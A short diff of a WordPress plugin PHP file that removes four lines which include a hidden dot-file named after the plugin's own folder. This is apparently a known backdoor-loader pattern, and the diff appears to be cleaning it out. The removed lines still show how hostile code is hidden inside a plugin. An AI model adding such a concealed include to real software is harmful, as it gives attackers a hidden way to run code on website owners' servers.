@@ -4,10 +4,6 @@
 \*----------------------------------------------------------------------------*/
 
 add_filter( 'pre_update_option_mpc_massive', 'mpc_recheck_mpc_massive', 10, 2 );
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 function mpc_recheck_mpc_massive( $new_value, $old_value ) {
 	$enable_dependencies = array(
 		'mpc_accordion'              => array( 'mpc_icon' ),
